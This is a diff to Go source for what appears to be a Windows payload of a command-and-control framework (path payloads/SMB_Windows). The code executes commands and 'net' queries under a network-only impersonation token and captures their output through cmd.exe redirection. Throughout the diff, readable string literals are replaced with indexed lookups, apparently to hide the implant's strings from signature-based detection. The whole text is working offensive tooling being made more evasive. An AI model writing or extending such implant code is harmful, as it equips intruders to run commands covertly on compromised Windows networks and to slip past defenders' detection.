@@ -1,4 +1,4 @@
-// server/docker/payloads/Windows/network_token_wrapper.go
+// server/docker/payloads/SMB_Windows/network_token_wrapper.go
 //go:build windows
 // +build windows
 
@@ -131,8 +131,11 @@ func WrapNetworkCommand(commandFunc func() CommandResult) CommandResult {
 	result := commandFunc()
 
 	// Prepend network token info to output
-	tokenInfo := fmt.Sprintf("Using network-only token: %s\n", netContext.TokenName)
-	result.Output = tokenInfo + result.Output
+	fmtStr := getNfStr(idxNfFmtUsingNetToken)
+	if fmtStr != "" {
+		tokenInfo := fmt.Sprintf(fmtStr, netContext.TokenName)
+		result.Output = tokenInfo + result.Output
+	}
 
 	return result
 }
@@ -147,7 +150,10 @@ func ExecuteNetworkCommand(ctx *CommandContext, command string, args []string) C
 
 	if netContext != nil && netContext.UseNetOnlyToken {
 		// Execute with network-only token
-		output = fmt.Sprintf("Executing with network-only token: %s\n", netContext.TokenName)
+		fmtExec := getNfStr(idxNfFmtExecNetToken)
+		if fmtExec != "" {
+			output = fmt.Sprintf(fmtExec, netContext.TokenName)
+		}
 
 		// Build full command line
 		fullCmd := command
@@ -176,7 +182,10 @@ func ExecuteNetworkCommand(ctx *CommandContext, command string, args []string) C
 		// Close process handle
 		CloseHandle(handle)
 
-		output += fmt.Sprintf("Process %d completed with exit code %d\n", pid, exitCode)
+		fmtComplete := getNfStr(idxNfFmtProcComplete)
+		if fmtComplete != "" {
+			output += fmt.Sprintf(fmtComplete, pid, exitCode)
+		}
 	} else {
 		// Execute normally
 		cmd := exec.Command(command, args...)
@@ -207,11 +216,20 @@ func ExecuteNetCommandWithToken(ctx *CommandContext, args []string) CommandResul
 	if netContext != nil && netContext.UseNetOnlyToken {
 		// Prepare to execute with network token
 		var output strings.Builder
-		output.WriteString(fmt.Sprintf("Using network-only token: %s\n", netContext.TokenName))
-		output.WriteString(fmt.Sprintf("    User: %s\n\n", GetTokenUserString(netContext.TokenHandle)))
+
+		fmtUsing := getNfStr(idxNfFmtUsingNetToken)
+		if fmtUsing != "" {
+			output.WriteString(fmt.Sprintf(fmtUsing, netContext.TokenName))
+		}
+
+		fmtUser := getNfStr(idxNfFmtUser)
+		if fmtUser != "" {
+			output.WriteString(fmt.Sprintf(fmtUser, GetTokenUserString(netContext.TokenHandle)))
+		}
 
 		// Execute the actual net command with the token context
-		cmdStr := "net " + strings.Join(args, " ")
+		netCmd := getNfStr(idxNfCmdNet)
+		cmdStr := netCmd + " " + strings.Join(args, " ")
 
 		// Create process with network token
 		handle, _, err := CreateProcessWithNetworkToken(cmdStr, netContext.TokenHandle)
@@ -219,7 +237,7 @@ func ExecuteNetCommandWithToken(ctx *CommandContext, args []string) CommandResul
 			output.WriteString(Err(E37) + "\n")
 
 			// Fallback to normal execution
-			cmd := exec.Command("net", args...)
+			cmd := exec.Command(netCmd, args...)
 			cmdOutput, cmdErr := cmd.CombinedOutput()
 			output.Write(cmdOutput)
 
@@ -243,10 +261,10 @@ func ExecuteNetCommandWithToken(ctx *CommandContext, args []string) CommandResul
 		syscall.WaitForSingleObject(handle, syscall.INFINITE)
 		CloseHandle(handle)
 
-		// Note: Getting output from the spawned process requires additional work
-		// with pipes, which would be implemented in a production version
-
-		output.WriteString("Command executed with network-only token\n")
+		msgComplete := getNfStr(idxNfMsgCmdExecNetToken)
+		if msgComplete != "" {
+			output.WriteString(msgComplete)
+		}
 
 		return CommandResult{
 			Output:      output.String(),
@@ -256,7 +274,8 @@ func ExecuteNetCommandWithToken(ctx *CommandContext, args []string) CommandResul
 	}
 
 	// No network-only token, execute normally
-	cmd := exec.Command("net", args...)
+	netCmd := getNfStr(idxNfCmdNet)
+	cmd := exec.Command(netCmd, args...)
 	output, err := cmd.CombinedOutput()
 
 	exitCode := 0
@@ -278,22 +297,28 @@ func ExecuteNetCommandWithToken(ctx *CommandContext, args []string) CommandResul
 // GetTokenUserString gets the user string from a token handle
 func GetTokenUserString(tokenHandle syscall.Handle) string {
 	// Implementation would query token for user info
-	// This is a simplified version
-	return "DOMAIN\\User"
+	// This is a simplified placeholder
+	placeholder := getNfStr(idxNfPlaceholderUser)
+	if placeholder != "" {
+		return placeholder
+	}
+	return ""
 }
 
-// In network_token_wrapper.go, add this improved version:
+// CreateProcessWithNetworkTokenAndCapture creates a process with token and captures output
 func CreateProcessWithNetworkTokenAndCapture(
 	commandLine string,
 	tokenHandle syscall.Handle,
 	workingDir string,
 ) (output string, exitCode int, err error) {
 	// Create temp file for output capture (more reliable than pipes)
-	tempFile := fmt.Sprintf("%s\\netonly_output_%d.txt", os.TempDir(), time.Now().UnixNano())
+	fmtTempFile := getNfStr(idxNfFmtTempFile)
+	tempFile := fmt.Sprintf(fmtTempFile, os.TempDir(), time.Now().UnixNano())
 	defer os.Remove(tempFile)
 
 	// Build command with output redirection
-	fullCommand := fmt.Sprintf("cmd.exe /c %s > \"%s\" 2>&1", commandLine, tempFile)
+	fmtRedirect := getNfStr(idxNfFmtCmdRedirect)
+	fullCommand := fmt.Sprintf(fmtRedirect, commandLine, tempFile)
 
 	var si syscall.StartupInfo
 	var pi syscall.ProcessInformation
